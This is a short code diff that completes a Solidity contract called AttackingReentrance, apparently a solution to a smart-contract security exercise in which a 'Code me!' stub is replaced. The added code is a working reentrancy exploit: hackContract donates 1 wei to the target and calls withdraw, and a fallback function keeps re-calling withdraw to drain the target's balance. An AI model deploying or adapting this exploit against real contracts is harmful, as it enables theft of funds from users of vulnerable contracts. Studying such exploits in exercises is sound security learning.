@@ -9,7 +9,14 @@ contract AttackingReentrance {
         contractAddress = _contractAddress;
     }
 
+    fallback() external payable {
+        if (Reentrance(contractAddress).balanceOf(address(this)) >= 1) {
+            Reentrance(contractAddress).withdraw();
+        }
+    }
+
     function hackContract() external {
-        // Code me!
+        Reentrance(contractAddress).donate{value: 1}(address(this));
+        Reentrance(contractAddress).withdraw();
     }
 }
